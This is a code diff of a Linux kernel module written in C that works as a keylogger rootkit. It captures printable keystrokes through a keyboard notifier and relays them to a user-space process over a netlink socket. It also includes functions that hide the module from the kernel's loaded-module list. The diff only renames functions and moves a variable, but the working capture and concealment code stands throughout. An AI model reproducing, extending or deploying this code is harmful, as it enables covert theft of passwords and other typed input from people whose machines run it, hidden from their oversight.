@@ -1,7 +1,6 @@
 #include "Module.h"
 /* We need these for hiding/revealing the kernel module */
 static struct list_head *prev_module;
-char key;
 struct sock *nl_sk = NULL;
 int pid;
 static struct notifier_block keylogger = {.notifier_call = notifier};
@@ -9,7 +8,6 @@ void showme(void)
 {
     list_add(&THIS_MODULE->list, prev_module);
 }
-
 /* Record where we are in the loaded module list by storing
  * the module prior to us in prev_module, then remove ourselves
  * from the list */
@@ -20,9 +18,10 @@ void hideme(void)
 }
 int notifier(struct notifier_block *block, unsigned long code, void *p)
 {
+    char key; 
     struct nlmsghdr *nlhead;
     struct sk_buff *skb_out;
-    int res;
+    int res; 
     struct keyboard_notifier_param *param=(struct keyboard_notifier_param*) p;
     key=param->value;
     if((int)code == KBD_KEYSYM && param->down == 1 && key> 0x20 && key < 0x7f)
@@ -43,8 +42,7 @@ int notifier(struct notifier_block *block, unsigned long code, void *p)
     }
     return 1;
 }
-
-static void myNetLink_recv_msg(struct sk_buff *skb)
+static void mynetlink_recv_msg(struct sk_buff *skb)
 {
     struct nlmsghdr *nlhead;
     printk(KERN_INFO "Entering: %s\n", __FUNCTION__);
@@ -52,11 +50,11 @@ static void myNetLink_recv_msg(struct sk_buff *skb)
     printk(KERN_INFO "MyNetlink has received: %s\n",(char*)nlmsg_data(nlhead));
     pid = nlhead->nlmsg_pid; 
 }
-static int __init myNetLink_init(void)
+static int __init mynetlink_init(void)
 {
     //hideme()
     struct netlink_kernel_cfg cfg = {
-        .input = myNetLink_recv_msg,
+        .input = mynetlink_recv_msg,
     };
     register_keyboard_notifier(&keylogger);
     nl_sk = netlink_kernel_create(&init_net, MY_NETLINK, &cfg);
@@ -65,18 +63,16 @@ static int __init myNetLink_init(void)
         printk(KERN_ALERT "Error creating socket.\n");
         return -10;
     }
-
     printk("MyNetLink Init OK!\n");
     return 0;
 }
 
-static void __exit myNetLink_exit(void)
+static void __exit mynetlink_exit(void)
 {
     printk(KERN_INFO "exiting myNetLink module\n");
     netlink_kernel_release(nl_sk);
     unregister_keyboard_notifier(&keylogger);
 }
-
-module_init(myNetLink_init);
-module_exit(myNetLink_exit);
+module_init(mynetlink_init);
+module_exit(mynetlink_exit);
 MODULE_LICENSE("GPL");
